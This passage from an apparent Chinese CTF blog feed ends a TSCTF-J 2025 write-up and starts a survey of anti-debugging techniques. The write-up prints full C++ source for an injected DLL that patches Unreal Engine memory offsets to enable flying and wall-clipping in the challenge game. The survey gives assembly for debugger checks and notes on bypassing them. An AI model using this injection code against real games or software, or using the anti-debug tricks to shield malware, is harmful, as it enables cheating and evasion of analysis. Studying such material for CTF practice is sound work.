<span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_MOVEMENT = <span class="number">0x288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CAPSULE = <span class="number">0x290</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCH = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELO = <span class="number">0x25C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UPRIMITIVE_BODYINSTANCE = <span class="number">0x2C8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_FBODYINSTANCE_COLLISIONENABLED = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_userFly&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_autoFlyFromCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_noCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_MOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCapsuleComponent* <span class="title">GetCapsuleComponent</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCapsuleComponent**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CAPSULE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLand = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunch = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCH);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Flying;</span><br><span class="line">        <span class="keyword">if</span> (giveBoost) &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">            lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLand = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunch = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVel = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> giveBoost)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVel = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELO);</span><br><span class="line"></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (giveBoost &amp;&amp; lastUpdateVel.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVel.Z = <span class="number">400.f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyCollisionState</span><span class="params">(UCapsuleComponent* capsule, <span class="type">bool</span> noCollision)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!capsule) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* primitive = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(capsule);</span><br><span class="line">    <span class="keyword">auto</span>&amp; collisionEnabled = *<span class="built_in">reinterpret_cast</span>&lt;ECollisionEnabled*&gt;(</span><br><span class="line">        primitive + OFFSET_UPRIMITIVE_BODYINSTANCE + OFFSET_FBODYINSTANCE_COLLISIONENABLED);</span><br><span class="line"></span><br><span class="line">    collisionEnabled = noCollision ? ECollisionEnabled::NoCollision</span><br><span class="line">        : ECollisionEnabled::QueryAndPhysics;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">ShouldFly</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> g_userFly.<span class="built_in">load</span>() || g_autoFlyFromCollision.<span class="built_in">load</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            g_userFly = !g_userFly.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F5) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            <span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character);</span><br><span class="line">            <span class="keyword">if</span> (!movement || !capsule) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="type">bool</span> newState = !g_noCollision.<span class="built_in">load</span>();</span><br><span class="line">            g_noCollision = newState;</span><br><span class="line">            g_autoFlyFromCollision = newState;</span><br><span class="line"></span><br><span class="line">            <span class="built_in">ApplyCollisionState</span>(capsule, newState);</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, <span class="built_in">ShouldFly</span>(), g_userFly.<span class="built_in">load</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；</span></span><br><span class="line"><span class="comment">            如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement/ Capsule，</span></span><br><span class="line"><span class="comment">            能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">ShouldFly</span>() || g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character)) &#123;</span><br><span class="line">                            <span class="built_in">SustainFly</span>(movement, g_userFly.<span class="built_in">load</span>());</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">auto</span> capsule = <span class="built_in">GetCapsuleComponent</span>(character); g_noCollision.<span class="built_in">load</span>()) &#123;</span><br><span class="line">                            <span class="built_in">ApplyCollisionState</span>(capsule, <span class="literal">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式\nF5 切换穿墙模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Flag：TSCTF-J{u0real_or_R1AL?!</p><p>还有一段flag找不到</p><p>只能看wp了</p><p>看了题解是藏在前面了_and_here}</p><p>TSCTF-J{u0real_or_R1AL?!_and_here}</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;TSCTF-J-2025-wp&quot;&gt;&lt;a href=&quot;#TSCTF-J-2025-wp&quot; class=&quot;headerlink&quot; title=&quot;TSCTF-J 2025 wp&quot;&gt;&lt;/a&gt;TSCTF-J 2025 wp&lt;/h1&gt;&lt;p&gt;本次TSCTF-J，共解出27道题，</summary>
      
    
    
    
    <category term="CTF wp" scheme="http://matriy330.github.io/categories/CTF-wp/"/>
    
    
    <category term="wp" scheme="http://matriy330.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>CTF逆向常见反调试技术总结</title>
    <link href="http://matriy330.github.io/21e5b258/"/>
    <id>http://matriy330.github.io/21e5b258/</id>
    <published>2025-10-06T16:00:00.000Z</published>
    <updated>2025-10-08T08:44:04.988Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CTF逆向常见反调试技术总结"><a href="#CTF逆向常见反调试技术总结" class="headerlink" title="CTF逆向常见反调试技术总结"></a>CTF逆向常见反调试技术总结</h1><p>反调试主要为了干扰动态调试</p><p>反调试是一种用于阻碍程序动态调试的技术，首先大致说明一下反调试的工作原理。</p><p>在操作系统内部提供了一些<strong>API</strong>，用于调试器调试。当调试器调用这些<strong>API</strong>时系统就会在被调试的进程内存中留下与调试器相关的信息。一部分信息是可以被抹除的，也有一部分信息是难以抹除的。</p><p>当调试器附加到目标程序后，用户的很多行为将优先被调试器捕捉和处理。其中大部分是通过异常捕获通信的，包括断点的本质就是异常。如果调试器遇到不想处理的信息，一种方式是忽略，另一种方式是交给操作系统处理。</p><p>那么目前为止，程序就有两种方式检测自己是否被调试：</p><ul><li>检测内存中是否有调试器的信息。</li><li>通过特定的指令或触发特定异常，检测返回结果。</li></ul><p>通常来说，存在反调试的程序，当检测到自身处于调试状态时，就会控制程序绕过关键代码，防止关键代码被调试，或者干脆直接退出程序。</p><h2 id="API反调试"><a href="#API反调试" class="headerlink" title="API反调试"></a>API反调试</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL IsDebuggerPresent();</span><br></pre></td></tr></table></figure><p>返回值为1表示当前进程被调试的状态，反之为0.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">call IsDebuggerPresent</span><br><span class="line">test al, al</span><br><span class="line">jne being_debugged</span><br></pre></td></tr></table></figure><p>实际上, 这个函数只是单纯地返回了<code>BeingDebugged</code>标志的值. 检查<code>BeingDebugged</code>标志位的方法也可以用以下 32 代码位代码检查 32 位环境来实现:</p><p>32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block</span><br><span class="line">cmp b [eax+2], 0 ;check BeingDebugged</span><br><span class="line">jne being_debugged</span><br></pre></td></tr></table></figure><p>64位：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">push 60h</span><br><span class="line">pop rsi</span><br><span class="line">gs:lodsq ;Process Environment Block</span><br><span class="line">cmp b [rax+2], 0 ;check BeingDebugged</span><br><span class="line">jne being_debugged</span><br></pre></td></tr></table></figure><p>或使用 32 位代码检测 64 位环境</p><p>检查段寄存器中的<code>fs:[0x30] (32位)</code> 和 <code>GS:[0x60] (64位)</code>也是一样的效果</p><blockquote><p>我们只要改掉判断条件或者nop掉就行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BOOL CheckRemoteDebuggerPresent(HANDLE hProcess, PBOOL pbDebuggerPresent);</span><br></pre></td></tr></table></figure><p>返回值为1表示当前进程被调试的状态，反之为0.</p><p><code>kernel32</code>的<code>CheckRemoteDebuggerPresent()</code>函数用于检测指定进程是否正在被调试. <code>Remote</code>在单词里是指同一个机器中的不同进程.</p><blockquote><p>如果调试器存在 (通常是检测自己是否正在被调试), 该函数会将<code>pbDebuggerPresent</code>指向的值设为<code>0xffffffff</code>.</p></blockquote><p>可以用以下 32 位代码检测 32 位环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">push eax</span><br><span class="line">push esp</span><br><span class="line">push -1 ;GetCurrentProcess()</span><br><span class="line">call CheckRemoteDebuggerPresent</span><br><span class="line">pop eax</span><br><span class="line">test eax, eax</span><br><span class="line">jne being_debugged</span><br></pre></td></tr></table></figure><p>或 64 位代码检测 64 位环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">enter 20h, 0</span><br><span class="line">mov edx, ebp</span><br><span class="line">or rcx, -1 ;GetCurrentProcess()</span><br><span class="line">call CheckRemoteDebuggerPresent</span><br><span class="line">leave</span><br><span class="line">test ebp, ebp</span><br><span class="line">jne being_debugged</span><br></pre></td></tr></table></figure><p><code>CheckRemoteDebuggerPresent</code>通过调用<code>NtQueryInformationProcess</code>来实现对调试器的检测，当参数设置为7时，<code>NtQueryInformationProcess</code>会返回远程调试器的端口</p><p>比如有如下的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    BOOL isDebuggerPresent = FALSE;</span><br><span class="line">    if (CheckRemoteDebuggerPresent(GetCurrentProcess(), &amp;isDebuggerPresent ))</span><br><span class="line">    &#123;</span><br><span class="line">        if (isDebuggerPresent )</span><br><span class="line">        &#123;</span><br><span class="line">            std::cout &lt;&lt; &quot;Stop debugging program!&quot; &lt;&lt; std::endl;</span><br><span class="line">            exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们可以直接修改<code>isDebuggerPresent</code>的值或修改跳转条件来绕过 (注意不是<code>CheckRemoteDebuggerPresent</code>的 izhi, 它的返回值是用于表示函数是否正确执行).</p><p>但如果要针对<code>CheckRemoteDebuggerPresent</code>这个 api 函数进行修改的话. 首先要知道<code>CheckRemoteDebuggerPresent</code>内部其实是通过调用<code>NtQueryInformationProcess</code>来完成功能的. 而我们就需要对<code>NtQueryInformationProcess</code>的返回值进行修改.</p><p>NtQueryInformationProcess这个函数会在后面重点介绍</p><p><strong>OutputDebugString</strong></p><p>在有调试器存在和没有调试器存在时，OutputDebugString函数表现会有所不同。最明显的不同是， 如果有调试器存在，其后的GetLastError()的返回值为零</p><h2 id="PEB反调试"><a href="#PEB反调试" class="headerlink" title="PEB反调试"></a>PEB反调试</h2><p>当程序处于Ring3(低权限)时， <code>FS:[0]</code> 寄存器指向<strong>TEB(Thread Environment Block)<strong>，即线程环境块结构体，</strong>TEB</strong>向后偏移0x30字节的位置保存的是<strong>PEB(Process Environment Block )</strong>,即进程环境块的结构体地址。<strong>PEB</strong>中的部分成员是与调息相关的成员，当调试器通过 Windows提供的<strong>API</strong>调试目标程序时，Windows会将一部分调试信息写人这个结构体中。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">kd&gt;dt_TEB</span><br><span class="line">nt! _TEB</span><br><span class="line">...</span><br><span class="line">+0x030 ProcessEnvironmentBlock :Ptr32_PEB</span><br><span class="line">...</span><br><span class="line">kd&gt;dt_TEB</span><br><span class="line">...</span><br><span class="line">+0x002 BeingDebugged:UChar</span><br><span class="line">...</span><br><span class="line">+Ox018 ProcessHeap:Ptr32 Void</span><br><span class="line">...</span><br><span class="line">+0x068 NtGlobalF1ag:Uint4B</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure><p>如<strong>NtGlobalFlag</strong></p><p>在 32 位机器上, <code>NtGlobalFlag</code>字段位于<code>PEB</code>(进程环境块)<code>0x68</code>的偏移处, 64 位机器则是在偏移<code>0xBC</code>位置. 该字段的默认值为 0. 当调试器正在运行时, 该字段会被设置为一个特定的值. 尽管该值并不能十分可信地表明某个调试器真的有在运行, 但该字段常出于该目的而被使用.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] → [eax+2] (BeingDebugged)；[eax+68h] (NtGlobalFlag)</span><br></pre></td></tr></table></figure><p>该字段包含有一系列的标志位. 由调试器创建的进程会设置以下标志位:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">FLG_HEAP_ENABLE_TAIL_CHECK (0x10)</span><br><span class="line">FLG_HEAP_ENABLE_FREE_CHECK (0x20)</span><br><span class="line">FLG_HEAP_VALIDATE_PARAMETERS (0x40)</span><br></pre></td></tr></table></figure><p>因此, 可以检查这几个标志位来检测调试器是否存在. 比如用形如以下的 32 位的代码在 32 位机器上进行检测:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mov eax, fs:[30h] ;Process Environment Block</span><br><span class="line">mov al, [eax+68h] ;NtGlobalFlag</span><br><span class="line">and al, 70h</span><br><span class="line">cmp al, 70h</span><br><span class="line">je being_debugged</span><br></pre></td></tr></table></figure><p>以下是 64 